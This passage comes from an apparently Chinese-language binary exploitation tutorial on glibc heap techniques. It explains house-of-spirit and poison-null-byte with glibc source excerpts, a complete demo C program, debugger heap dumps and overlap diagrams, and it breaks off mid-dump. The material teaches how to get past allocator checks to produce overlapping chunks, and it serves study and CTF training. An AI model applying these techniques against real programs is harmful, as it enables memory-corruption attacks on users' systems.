<code>av-&gt;system_mem</code>\uff08\u5373\u5c0f\u4e8e128kb\uff09\uff0c\u624d\u80fd\u7ed5\u8fc7\u5bf9 next chunk \u5927\u5c0f\u7684\u68c0\u67e5\u3002</p> <p>libc-2.23 \u4e2d\u8fd9\u4e9b\u68c0\u67e5\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>void\n__libc_free (void *mem)\n{\n  mstate ar_ptr;\n  mchunkptr p;                          /* chunk corresponding to mem */\n\n  [...]\n  p = mem2chunk (mem);\n\n  if (chunk_is_mmapped (p))                       /* release mmapped memory. */\n    {\n      [...]\n      munmap_chunk (p);\n      return;\n    }\n\n  ar_ptr = arena_for_chunk (p);     // \u83b7\u5f97 chunk \u6240\u5c5e arena \u7684\u5730\u5740\n  _int_free (ar_ptr, p, 0);         // \u5f53 IS_MMAPPED \u4e3a\u96f6\u65f6\u8c03\u7528\n}\n</code></pre> <p><code>mem</code> \u5c31\u662f\u6211\u4eec\u6240\u63a7\u5236\u7684\u4f20\u9012\u7ed9 free \u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u4e2d\u4e0b\u9762\u4e24\u4e2a\u51fd\u6570\u7528\u4e8e\u5728 chunk \u6307\u9488\u548c malloc \u6307\u9488\u4e4b\u95f4\u505a\u8f6c\u6362\uff1a</p> <pre><code>/* conversion from malloc headers to user pointers, and back */\n\n#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))\n#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))\n</code></pre> <p>\u5f53 <code>NON_MAIN_ARENA</code> \u4e3a\u96f6\u65f6\u8fd4\u56de main arena\uff1a</p> <pre><code>/* find the heap and corresponding arena for a given ptr */\n\n#define heap_for_ptr(ptr) \\\n  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))\n#define arena_for_chunk(ptr) \\\n  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)\n</code></pre> <p>\u8fd9\u6837\uff0c\u7a0b\u5e8f\u5c31\u987a\u5229\u5730\u8fdb\u5165\u4e86 <code>_int_free</code> \u51fd\u6570\uff1a</p> <pre><code>static void\n_int_free (mstate av, mchunkptr p, int have_lock)\n{\n  INTERNAL_SIZE_T size;        /* its size */\n  mfastbinptr *fb;             /* associated fastbin */\n\n  [...]\n  size = chunksize (p);\n\n  [...]\n  /*\n    If eligible, place chunk on a fastbin so it can be found\n    and used quickly in malloc.\n  */\n\n  if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())\n\n#if TRIM_FASTBINS\n      /*\n    If TRIM_FASTBINS set, don't place chunks\n    bordering top into fastbins\n      */\n      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)\n#endif\n      ) {\n\n    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)\n    || __builtin_expect (chunksize (chunk_at_offset (p, size))\n                 &gt;= av-&gt;system_mem, 0))\n      {\n        [...]\n        errstr = \"free(): invalid next size (fast)\";\n        goto errout;\n      }\n\n    [...]\n    set_fastchunks(av);\n    unsigned int idx = fastbin_index(size);\n    fb = &amp;fastbin (av, idx);\n\n    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */\n    mchunkptr old = *fb, old2;\n    [...]\n    do\n      {\n    [...]\n    p-&gt;fd = old2 = old;\n      }\n    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);\n</code></pre> <p>\u5176\u4e2d\u4e0b\u9762\u7684\u5b8f\u51fd\u6570\u7528\u4e8e\u83b7\u5f97 next chunk\uff1a</p> <pre><code>/* Treat space at ptr + offset as a chunk */\n#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))\n</code></pre> <p>\u7136\u540e\u4fee\u6539\u6307\u9488 a \u6307\u5411 (fake chunk 1 + 0x10) \u7684\u4f4d\u7f6e\uff0c\u5373\u4e0a\u9762\u63d0\u5230\u7684 <code>mem</code>\u3002\u7136\u540e\u5c06\u5176\u4f20\u9012\u7ed9 free \u51fd\u6570\uff0c\u8fd9\u65f6\u7a0b\u5e8f\u5c31\u4f1a\u8bef\u4ee5\u4e3a\u8fd9\u662f\u4e00\u5757\u771f\u7684 chunk\uff0c\u7136\u540e\u5c06\u5176\u91ca\u653e\u5e76\u52a0\u5165\u5230 fastbin \u4e2d\u3002</p> <pre><code>gef\u27a4  x/gx &amp;a\n0x7fffffffdca0: 0x00007fffffffdcc0\ngef\u27a4  x/10gx &amp;fake_chunks\n0x7fffffffdcb0: 0x0000000000000000  0x0000000000000020  &lt;-- fake chunk 1 [be freed]\n0x7fffffffdcc0: 0x0000000000000000  0x0000000000000000\n0x7fffffffdcd0: 0x0000000000000001  0x0000000000001234  &lt;-- fake chunk 2\n0x7fffffffdce0: 0x4141414141414141  0x0000000000000000\n0x7fffffffdcf0: 0x0000000000400820  0x00000000004005b0\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x7fffffffdcc0, size=0x20, flags=)\n</code></pre> <p>\u8fd9\u65f6\u5982\u679c\u6211\u4eec malloc \u4e00\u4e2a\u5bf9\u5e94\u5927\u5c0f\u7684 fast chunk\uff0c\u7a0b\u5e8f\u5c06\u4ece fastbins \u4e2d\u5206\u914d\u51fa\u8fd9\u5757\u88ab\u91ca\u653e\u7684 chunk\u3002</p> <pre><code>gef\u27a4  x/10gx &amp;fake_chunks\n0x7fffffffdcb0: 0x0000000000000000  0x0000000000000020  &lt;-- new chunk\n0x7fffffffdcc0: 0x4242424242424242  0x0000000000000000\n0x7fffffffdcd0: 0x0000000000000001  0x0000000000001234  &lt;-- fake chunk 2\n0x7fffffffdce0: 0x4141414141414141  0x0000000000000000\n0x7fffffffdcf0: 0x0000000000400820  0x00000000004005b0\ngef\u27a4  x/gx &amp;b\n0x7fffffffdca8: 0x00007fffffffdcc0\n</code></pre> <p>\u6240\u4ee5 house-of-spirit \u7684\u4e3b\u8981\u76ee\u7684\u662f\uff0c\u5f53\u6211\u4eec\u4f2a\u9020\u7684 fake chunk \u5185\u90e8\u5b58\u5728\u4e0d\u53ef\u63a7\u533a\u57df\u65f6\uff0c\u8fd0\u7528\u8fd9\u4e00\u6280\u672f\u53ef\u4ee5\u5c06\u8fd9\u7247\u533a\u57df\u53d8\u6210\u53ef\u63a7\u7684\u3002\u4e0a\u9762\u4e3a\u4e86\u65b9\u4fbf\u89c2\u5bdf\uff0c\u5728 fake chunk \u91cc\u586b\u5145\u4e00\u4e9b\u5b57\u6bcd\uff0c\u4f46\u5728\u73b0\u5b9e\u4e2d\u8fd9\u4e9b\u4f4d\u7f6e\u5f88\u53ef\u80fd\u662f\u4e0d\u53ef\u63a7\u7684\uff0c\u800c house-of-spirit \u4e5f\u6b63\u662f\u4ee5\u6b64\u4e3a\u76ee\u7684\u800c\u51fa\u73b0\u7684\u3002</p> <p>\u8be5\u6280\u672f\u7684\u7f3a\u70b9\u4e5f\u662f\u9700\u8981\u5bf9\u6808\u5730\u5740\u8fdb\u884c\u6cc4\u6f0f\uff0c\u5426\u5219\u65e0\u6cd5\u6b63\u786e\u8986\u76d6\u9700\u8981\u91ca\u653e\u7684\u5806\u6307\u9488\uff0c\u4e14\u5728\u6784\u9020\u6570\u636e\u65f6\uff0c\u9700\u8981\u6ee1\u8db3\u5bf9\u9f50\u7684\u8981\u6c42\u7b49\u3002</p> <p>\u52a0\u4e0a\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u91cd\u65b0\u7f16\u8bd1\uff0c\u53ef\u4ee5\u770b\u5230\u95ee\u9898\u6240\u5728\uff0c\u5373\u5c1d\u8bd5 free \u4e00\u5757\u4e0d\u662f\u7531 malloc \u5206\u914d\u7684 chunk\uff1a</p> <pre><code>$ gcc -fsanitize=address -g house_of_spirit.c\n$ ./a.out\nWe will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.\nThe first one:  0x7fffa61d6c00\nThe second one: 0x7fffa61d6c20\nOverwritting our pointer with the address of the fake region inside the fake first chunk, 0x7fffa61d6c00.\nFreeing the overwritten pointer.\n=================================================================\n==5282==ERROR: AddressSanitizer: attempting free on address which was not malloc()-ed: 0x7fffa61d6c10 in thread T0\n    #0 0x7fc4c3a332ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca)\n    #1 0x400cab in main /home/firmyy/how2heap/house_of_spirit.c:24\n    #2 0x7fc4c35f182f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)\n    #3 0x4009b8 in _start (/home/firmyy/how2heap/a.out+0x4009b8)\n</code></pre> <p>house-of-spirit \u5728 libc-2.26 \u4e0b\u7684\u5229\u7528\u53ef\u4ee5\u67e5\u770b\u7ae0\u8282 4.14\u3002</p>"},{"location":"Training/Material/Binary%20Exploitation/#317-linux","title":"3.1.7 Linux \u5806\u5229\u7528\uff08\u4e2d\uff09","text":"<ul> <li>how2heap</li> <li>poison_null_byte</li> <li>house_of_lore</li> <li>overlapping_chunks</li> <li>overlapping_chunks_2</li> </ul> <p>\u4e0b\u8f7d\u6587\u4ef6</p>"},{"location":"Training/Material/Binary%20Exploitation/#how2heap_1","title":"how2heap","text":""},{"location":"Training/Material/Binary%20Exploitation/#poison_null_byte","title":"poison_null_byte","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;malloc.h&gt;\n\nint main() {\n    uint8_t *a, *b, *c, *b1, *b2, *d;\n\n    a = (uint8_t*) malloc(0x10);\n    int real_a_size = malloc_usable_size(a);\n    fprintf(stderr, \"We allocate 0x10 bytes for 'a': %p\\n\", a);\n    fprintf(stderr, \"'real' size of 'a': %#x\\n\", real_a_size);\n\n    b = (uint8_t*) malloc(0x100);\n    c = (uint8_t*) malloc(0x80);\n    fprintf(stderr, \"b: %p\\n\", b);\n    fprintf(stderr, \"c: %p\\n\", c);\n\n    uint64_t* b_size_ptr = (uint64_t*)(b - 0x8);\n    *(size_t*)(b+0xf0) = 0x100;\n    fprintf(stderr, \"b.size: %#lx ((0x100 + 0x10) | prev_in_use)\\n\\n\", *b_size_ptr);\n\n    // deal with tcache\n    // int *k[10], i;\n    // for (i = 0; i &lt; 7; i++) {\n    //     k[i] = malloc(0x100);\n    // }\n    // for (i = 0; i &lt; 7; i++) {\n    //     free(k[i]);\n    // }\n    free(b);\n    uint64_t* c_prev_size_ptr = ((uint64_t*)c) - 2;\n    fprintf(stderr, \"After free(b), c.prev_size: %#lx\\n\", *c_prev_size_ptr);\n\n    a[real_a_size] = 0; // &lt;--- THIS IS THE \"EXPLOITED BUG\"\n    fprintf(stderr, \"We overflow 'a' with a single null byte into the metadata of 'b'\\n\");\n    fprintf(stderr, \"b.size: %#lx\\n\\n\", *b_size_ptr);\n\n    fprintf(stderr, \"Pass the check: chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\\n\", *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));\n    b1 = malloc(0x80);\n    memset(b1, 'A', 0x80);\n    fprintf(stderr, \"We malloc 'b1': %p\\n\", b1);\n    fprintf(stderr, \"c.prev_size: %#lx\\n\", *c_prev_size_ptr);\n    fprintf(stderr, \"fake c.prev_size: %#lx\\n\\n\", *(((uint64_t*)c)-4));\n\n    b2 = malloc(0x40);\n    memset(b2, 'A', 0x40);\n    fprintf(stderr, \"We malloc 'b2', our 'victim' chunk: %p\\n\", b2);\n\n    // deal with tcache\n    // for (i = 0; i &lt; 7; i++) {\n    //     k[i] = malloc(0x80);\n    // }\n    // for (i = 0; i &lt; 7; i++) {\n    //     free(k[i]);\n    // }\n    free(b1);\n    free(c);\n    fprintf(stderr, \"Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\\n\");\n\n    d = malloc(0x110);\n    fprintf(stderr, \"Finally, we allocate 'd', overlapping 'b2': %p\\n\\n\", d);\n\n    fprintf(stderr, \"b2 content:%s\\n\", b2);\n    memset(d, 'B', 0xb0);\n    fprintf(stderr, \"New b2 content:%s\\n\", b2);\n}\n$ gcc -g poison_null_byte.c\n$ ./a.out\nWe allocate 0x10 bytes for 'a': 0xabb010\n'real' size of 'a': 0x18\nb: 0xabb030\nc: 0xabb140\nb.size: 0x111 ((0x100 + 0x10) | prev_in_use)\n\nAfter free(b), c.prev_size: 0x110\nWe overflow 'a' with a single null byte into the metadata of 'b'\nb.size: 0x100\n\nPass the check: chunksize(P) == 0x100 == 0x100 == prev_size (next_chunk(P))\nWe malloc 'b1': 0xabb030\nc.prev_size: 0x110\nfake c.prev_size: 0x70\n\nWe malloc 'b2', our 'victim' chunk: 0xabb0c0\nNow we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\nFinally, we allocate 'd', overlapping 'b2': 0xabb030\n\nb2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nNew b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n</code></pre> <p>\u8be5\u6280\u672f\u9002\u7528\u7684\u573a\u666f\u9700\u8981\u67d0\u4e2a malloc \u7684\u5185\u5b58\u533a\u57df\u5b58\u5728\u4e00\u4e2a\u5355\u5b57\u8282\u6ea2\u51fa\u6f0f\u6d1e\u3002\u901a\u8fc7\u6ea2\u51fa\u4e0b\u4e00\u4e2a chunk \u7684 size \u5b57\u6bb5\uff0c\u653b\u51fb\u8005\u80fd\u591f\u5728\u5806\u4e2d\u521b\u9020\u51fa\u91cd\u53e0\u7684\u5185\u5b58\u5757\uff0c\u4ece\u800c\u8fbe\u5230\u6539\u5199\u5176\u4ed6\u6570\u636e\u7684\u76ee\u7684\u3002\u518d\u7ed3\u5408\u5176\u4ed6\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u540c\u6837\u80fd\u591f\u83b7\u5f97\u7a0b\u5e8f\u7684\u63a7\u5236\u6743\u3002</p> <p>\u5bf9\u4e8e\u5355\u5b57\u8282\u6ea2\u51fa\u7684\u5229\u7528\u6709\u4e0b\u9762\u51e0\u79cd\uff1a</p> <ul> <li>\u6269\u5c55\u88ab\u91ca\u653e\u5757\uff1a\u5f53\u6ea2\u51fa\u5757\u7684\u4e0b\u4e00\u5757\u4e3a\u88ab\u91ca\u653e\u5757\u4e14\u5904\u4e8e unsorted bin \u4e2d\uff0c\u5219\u901a\u8fc7\u6ea2\u51fa\u4e00\u4e2a\u5b57\u8282\u6765\u5c06\u5176\u5927\u5c0f\u6269\u5927\uff0c\u4e0b\u6b21\u53d6\u5f97\u6b21\u5757\u65f6\u5c31\u610f\u5473\u7740\u5176\u540e\u7684\u5757\u5c06\u88ab\u8986\u76d6\u800c\u9020\u6210\u8fdb\u4e00\u6b65\u7684\u6ea2\u51fa</li> </ul> <pre><code>  0x100   0x100    0x80\n|-------|-------|-------|\n|   A   |   B   |   C   |   \u521d\u59cb\u72b6\u6001\n|-------|-------|-------|\n|   A   |   B   |   C   |   \u91ca\u653e B\n|-------|-------|-------|\n|   A   |   B   |   C   |   \u6ea2\u51fa B \u7684 size \u4e3a 0x180\n|-------|-------|-------|\n|   A   |   B   |   C   |   malloc(0x180-8)\n|-------|-------|-------|   C \u5757\u88ab\u8986\u76d6\n        |&lt;--\u5b9e\u9645\u5f97\u5230\u7684\u5757-&gt;|\n</code></pre> <ul> <li>\u6269\u5c55\u5df2\u5206\u914d\u5757\uff1a\u5f53\u6ea2\u51fa\u5757\u7684\u4e0b\u4e00\u5757\u4e3a\u4f7f\u7528\u4e2d\u7684\u5757\uff0c\u5219\u9700\u8981\u5408\u7406\u63a7\u5236\u6ea2\u51fa\u7684\u5b57\u8282\uff0c\u4f7f\u5176\u88ab\u91ca\u653e\u65f6\u7684\u5408\u5e76\u64cd\u4f5c\u80fd\u591f\u987a\u5229\u8fdb\u884c\uff0c\u4f8b\u5982\u76f4\u63a5\u52a0\u4e0a\u4e0b\u4e00\u5757\u7684\u5927\u5c0f\u4f7f\u5176\u5b8c\u5168\u88ab\u8986\u76d6\u3002\u4e0b\u4e00\u6b21\u5206\u914d\u5bf9\u5e94\u5927\u5c0f\u65f6\uff0c\u5373\u53ef\u53d6\u5f97\u5df2\u7ecf\u88ab\u6269\u5927\u7684\u5757\uff0c\u5e76\u9020\u6210\u8fdb\u4e00\u6b65\u6ea2\u51fa</li> </ul> <pre><code>  0x100   0x100    0x80\n|-------|-------|-------|\n|   A   |   B   |   C   |   \u521d\u59cb\u72b6\u6001\n|-------|-------|-------|\n|   A   |   B   |   C   |   \u6ea2\u51fa B \u7684 size \u4e3a 0x180\n|-------|-------|-------|\n|   A   |   B   |   C   |   \u91ca\u653e B\n|-------|-------|-------|\n|   A   |   B   |   C   |   malloc(0x180-8)\n|-------|-------|-------|   C \u5757\u88ab\u8986\u76d6\n        |&lt;--\u5b9e\u9645\u5f97\u5230\u7684\u5757-&gt;|\n</code></pre> <ul> <li>\u6536\u7f29\u88ab\u91ca\u653e\u5757\uff1a\u6b64\u60c5\u51b5\u9488\u5bf9\u6ea2\u51fa\u7684\u5b57\u8282\u53ea\u80fd\u4e3a 0 \u7684\u65f6\u5019\uff0c\u4e5f\u5c31\u662f\u672c\u8282\u6240\u8bf4\u7684 poison-null-byte\uff0c\u6b64\u65f6\u5c06\u4e0b\u4e00\u4e2a\u88ab\u91ca\u653e\u7684\u5757\u5927\u5c0f\u7f29\u5c0f\uff0c\u5982\u6b64\u4e00\u6765\u5728\u4e4b\u540e\u5206\u88c2\u6b64\u5757\u65f6\u5c06\u65e0\u6cd5\u6b63\u786e\u66f4\u65b0\u540e\u4e00\u5757\u7684 prev_size \u5b57\u6bb5\uff0c\u5bfc\u81f4\u91ca\u653e\u65f6\u51fa\u73b0\u91cd\u53e0\u7684\u5806\u5757</li> </ul> <pre><code>  0x100     0x210     0x80\n|-------|---------------|-------|\n|   A   |       B       |   C   |   \u521d\u59cb\u72b6\u6001\n|-------|---------------|-------|\n|   A   |       B       |   C   |   \u91ca\u653e B\n|-------|---------------|-------|\n|   A   |       B       |   C   |   \u6ea2\u51fa B \u7684 size \u4e3a 0x200\n|-------|---------------|-------|   \u4e4b\u540e\u7684 malloc \u64cd\u4f5c\u6ca1\u6709\u66f4\u65b0 C \u7684 prev_size\n         0x100  0x80\n|-------|------|-----|--|-------|\n|   A   |  B1  | B2  |  |   C   |   malloc(0x180-8), malloc(0x80-8)\n|-------|------|-----|--|-------|\n|   A   |  B1  | B2  |  |   C   |   \u91ca\u653e B1\n|-------|------|-----|--|-------|\n|   A   |  B1  | B2  |  |   C   |   \u91ca\u653e C\uff0cC \u5c06\u4e0e B1 \u5408\u5e76\n|-------|------|-----|--|-------|  \n|   A   |  B1  | B2  |  |   C   |   malloc(0x180-8)\n|-------|------|-----|--|-------|   B2 \u5c06\u88ab\u8986\u76d6\n        |&lt;\u5b9e\u9645\u5f97\u5230\u7684\u5757&gt;|\n</code></pre> <ul> <li>house of einherjar\uff1a\u4e5f\u662f\u6ea2\u51fa\u5b57\u8282\u53ea\u80fd\u4e3a 0 \u7684\u60c5\u51b5\uff0c\u5f53\u5b83\u662f\u66f4\u65b0\u6ea2\u51fa\u5757\u4e0b\u4e00\u5757\u7684 prev_size \u5b57\u6bb5\uff0c\u4f7f\u5176\u5728\u88ab\u91ca\u653e\u65f6\u80fd\u591f\u627e\u5230\u4e4b\u524d\u4e00\u4e2a\u5408\u6cd5\u7684\u88ab\u91ca\u653e\u5757\u5e76\u4e0e\u5176\u5408\u5e76\uff0c\u9020\u6210\u5806\u5757\u91cd\u53e0</li> </ul> <pre><code>  0x100   0x100   0x101\n|-------|-------|-------|\n|   A   |   B   |   C   |   \u521d\u59cb\u72b6\u6001\n|-------|-------|-------|\n|   A   |   B   |   C   |   \u91ca\u653e A\n|-------|-------|-------|\n|   A   |   B   |   C   |   \u6ea2\u51fa B\uff0c\u8986\u76d6 C \u5757\u7684 size \u4e3a 0x200\uff0c\u5e76\u4f7f\u5176 prev_size \u4e3a 0x200\n|-------|-------|-------|\n|   A   |   B   |   C   |   \u91ca\u653e C\n|-------|-------|-------|\n|   A   |   B   |   C   |   C \u5c06\u4e0e A \u5408\u5e76\n|-------|-------|-------|   B \u5757\u88ab\u91cd\u53e0\n|&lt;-----\u5b9e\u9645\u5f97\u5230\u7684\u5757------&gt;|\n</code></pre> <p>\u9996\u5148\u5206\u914d\u4e09\u4e2a chunk\uff0c\u7b2c\u4e00\u4e2a chunk \u7c7b\u578b\u65e0\u6240\u8c13\uff0c\u4f46\u540e\u4e24\u4e2a\u4e0d\u80fd\u662f fast chunk\uff0c\u56e0\u4e3a fast chunk \u5728\u91ca\u653e\u540e\u4e0d\u4f1a\u88ab\u5408\u5e76\u3002\u8fd9\u91cc chunk a \u7528\u4e8e\u5236\u9020\u5355\u5b57\u8282\u6ea2\u51fa\uff0c\u53bb\u8986\u76d6 chunk b \u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\uff0cchunk c \u7684\u4f5c\u7528\u662f\u5e2e\u52a9\u4f2a\u9020 fake chunk\u3002</p> <p>\u9996\u5148\u662f\u6ea2\u51fa\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u77e5\u9053\u4e00\u4e2a\u5806\u5757\u5b9e\u9645\u53ef\u7528\u7684\u5185\u5b58\u5927\u5c0f\uff08\u56e0\u4e3a\u7a7a\u95f4\u590d\u7528\uff0c\u53ef\u80fd\u4f1a\u6bd4\u5206\u914d\u65f6\u8981\u5927\u4e00\u70b9\uff09\uff0c\u7528\u4e8e\u83b7\u5f97\u8be5\u5927\u5c0f\u7684\u51fd\u6570 <code>malloc_usable_size</code> \u5982\u4e0b\uff1a</p> <pre><code>/*\n   ------------------------- malloc_usable_size -------------------------\n */\nstatic size_t\nmusable (void *mem)\n{\n  mchunkptr p;\n  if (mem != 0)\n    {\n      p = mem2chunk (mem);\n\n      [...]\n      if (chunk_is_mmapped (p))\n        return chunksize (p) - 2 * SIZE_SZ;\n      else if (inuse (p))\n        return chunksize (p) - SIZE_SZ;\n    }\n  return 0;\n}\n/* check for mmap()'ed chunk */\n#define chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)\n/* extract p's inuse bit */\n#define inuse(p)                                  \\\n  ((((mchunkptr) (((char *) (p)) + ((p)-&gt;size &amp; ~SIZE_BITS)))-&gt;size) &amp; PREV_INUSE)\n/* Get size, ignoring use bits */\n#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))\n</code></pre> <p>\u6240\u4ee5 <code>real_a_size = chunksize(a) - 0x8 == 0x18</code>\u3002\u53e6\u5916\u9700\u8981\u6ce8\u610f\u7684\u662f\u7a0b\u5e8f\u662f\u901a\u8fc7 next chunk \u7684 <code>PREV_INUSE</code> \u6807\u5fd7\u6765\u5224\u65ad\u67d0 chunk \u662f\u5426\u88ab\u4f7f\u7528\u7684\u3002</p> <p>\u4e3a\u4e86\u5728\u4fee\u6539 chunk b \u7684 size \u5b57\u6bb5\u540e\uff0c\u4f9d\u7136\u80fd\u901a\u8fc7 unlink \u7684\u68c0\u67e5\uff0c\u6211\u4eec\u9700\u8981\u4f2a\u9020\u4e00\u4e2a c.prev_size \u5b57\u6bb5\uff0c\u5b57\u6bb5\u7684\u5927\u5c0f\u662f\u5f88\u597d\u8ba1\u7b97\u7684\uff0c\u5373 <code>0x100 == (0x111 &amp; 0xff00)</code>\uff0c\u6b63\u597d\u662f NULL \u5b57\u8282\u6ea2\u51fa\u540e\u7684\u503c\u3002\u7136\u540e\u628a chunk b \u91ca\u653e\u6389\uff0cchunk b \u968f\u540e\u88ab\u653e\u5230 unsorted bin \u4e2d\uff0c\u5927\u5c0f\u662f 0x110\u3002\u6b64\u65f6\u7684\u5806\u5e03\u5c40\u5982\u4e0b\uff1a</p> <pre><code>gef\u27a4  x/42gx a-0x10\n0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a\n0x603010:    0x0000000000000000    0x0000000000000000\n0x603020:    0x0000000000000000    0x0000000000000111  &lt;-- chunk b [be freed]\n0x603030:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer\n0x603040:    0x0000000000000000    0x0000000000000000\n0x603050:    0x0000000000000000    0x0000000000000000\n0x603060:    0x0000000000000000    0x0000000000000000\n0x603070:    0x0000000000000000    0x0000000000000000\n0x603080:    0x0000000000000000    0x0000000000000000\n0x603090:    0x0000000000000000    0x0000000000000000\n0x6030a0:    0x0000000000000000    0x0000000000000000\n0x6030b0:    0x0000000000000000    0x0000000000000000\n0x6030c0:    0x0000000000000000    0x0000000000000000\n0x6030d0:    0x0000000000000000    0x0000000000000000\n0x6030e0:    0x0000000000000000    0x0000000000000000\n0x6030f0:    0x0000000000000000    0x0000000000000000\n0x603100:    0x0000000000000000    0x0000000000000000\n0x603110:    0x0000000000000000    0x0000000000000000\n0x603120:    0x0000000000000100    0x0000000000000000      &lt;-- fake c.prev_size\n0x603130:    0x0000000000000110    0x0000000000000090  &lt;-- chunk c\n0x603140:    0x0000000000000000    0x0000000000000000\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x603020, bk=0x603020\n \u2192   Chunk(addr=0x603030, size=0x110, flags=PREV_INUSE)\n</code></pre> <p>\u6700\u5173\u952e\u7684\u4e00\u6b65\uff0c\u901a\u8fc7\u6ea2\u51fa\u6f0f\u6d1e\u8986\u5199 chunk b \u7684\u6570\u636e\uff1a</p> <pre><code>gef\u27a4  x/42gx a-0x10\n0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a\n0x603010:    0x0000000000000000    0x0000000000000000\n0x603020:    0x0000000000000000    0x0000000000000100  &lt;-- chunk b [be freed]\n0x603030:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer\n0x603040:    0x0000000000000000    0x0000000000000000\n0x603050:    0x0000000000000000    0x0000000000000000\n0x603060:    0x0000000000000000    0x0000000000000000\n0x603070:    0x0000000000000000    0x0000000000000000\n0x603080:    0x0000000000000000    0x0000000000000000\n0x603090:    0x0000000000000000    0x0000000000000000\n0x6030a0:    0x0000000000000000    0x0000000000000000\n0x6030b0:    0x0000000000000000    0x0000000000000000\n0x6030c0:    0x0000000000000000    0x0000000000000000\n0x6030d0:    0x0000000000000000    0x0000000000000000\n0x6030e0:    0x0000000000000000    0x0000000000000000\n0x6030f0:    0x0000000000000000    0x0000000000000000\n0x603100:    0x0000000000000000    0x0000000000000000\n0x603110:    0x0000000000000000    0x0000000000000000\n0x603120:    0x0000000000000100    0x0000000000000000      &lt;-- fake c.prev_size\n0x603130:    0x0000000000000110    0x0000000000000090  &lt;-- chunk c\n0x603140:    0x0000000000000000    0x0000000000000000\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] unsorted_bins[0]: fw=0x603020, bk=0x603020\n \u2192   Chunk(addr=0x603030, size=0x100, flags=)\n</code></pre> <p>\u8fd9\u65f6\uff0c\u6839\u636e\u6211\u4eec\u4e0a\u4e00\u7bc7\u6587\u5b57\u4e2d\u8bb2\u5230\u7684\u8ba1\u7b97\u65b9\u6cd5\uff1a</p> <ul> <li><code>chunksize(P) == *((size_t*)(b-0x8)) &amp; (~ 0x7) == 0x100</code></li> <li><code>prev_size (next_chunk(P)) == *(size_t*)(b-0x10 + 0x100) == 0x100</code></li> </ul> <p>\u53ef\u4ee5\u6210\u529f\u7ed5\u8fc7\u68c0\u67e5\u3002\u53e6\u5916 unsorted bin \u4e2d\u7684 chunk \u5927\u5c0f\u4e5f\u53d8\u6210\u4e86 0x100\u3002</p> <p>\u63a5\u4e0b\u6765\u968f\u610f\u5206\u914d\u4e24\u4e2a chunk\uff0cmalloc \u4f1a\u4ece unsorted bin \u4e2d\u5212\u51fa\u5408\u9002\u5927\u5c0f\u7684\u5185\u5b58\u8fd4\u56de\u7ed9\u7528\u6237\uff1a</p> <pre><code>gef\u27a4  x/42gx a-0x10\n0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a\n0x603010:    0x0000000000000000    0x0000000000000000\n0x603020:    0x0000000000000000    0x0000000000000091  &lt;-- chunk b1  &lt;-- fake chunk b\n0x603030:    0x4141414141414141    0x4141414141414141\n0x603040:    0x4141414141414141    0x4141414141414141\n0x603050:    0x4141414141414141    0x4141414141414141\n0x603060:    0x4141414141414141    0x4141414141414141\n0x603070:    0x4141414141414141    0x4141414141414141\n0x603080:    0x4141414141414141    0x4141414141414141\n0x603090:    0x4141414141414141    0x4141414141414141\n0x6030a0:    0x4141414141414141    0x4141414141414141\n0x6030b0:    0x0000000000000000    0x0000000000000051  &lt;-- chunk b2  &lt;-- 'victim' chunk\n0x6030c0:    0x4141414141414141    0x4141414141414141\n0x6030d0:    0x4141414141414141    0x4141414141414141\n0x6030e0:    0x4141414141414141    0x4141414141414141\n0x6030f0:    0x4141414141414141    0x4141414141414141\n0x603100:    0x0000000000000000    0x0000000000000021  &lt;-- unsorted bin\n0x603110:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer\n0x603120:    0x0000000000000020    0x0000000000000000      &lt;-- fake c.prev_size\n0x603130:    0x0000000000000110    0x0000000000000090  &lt;-- chunk c\n0x603140:    0x0000000000000000    0x0000000000000000\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena 'main_arena' ]\n[+] 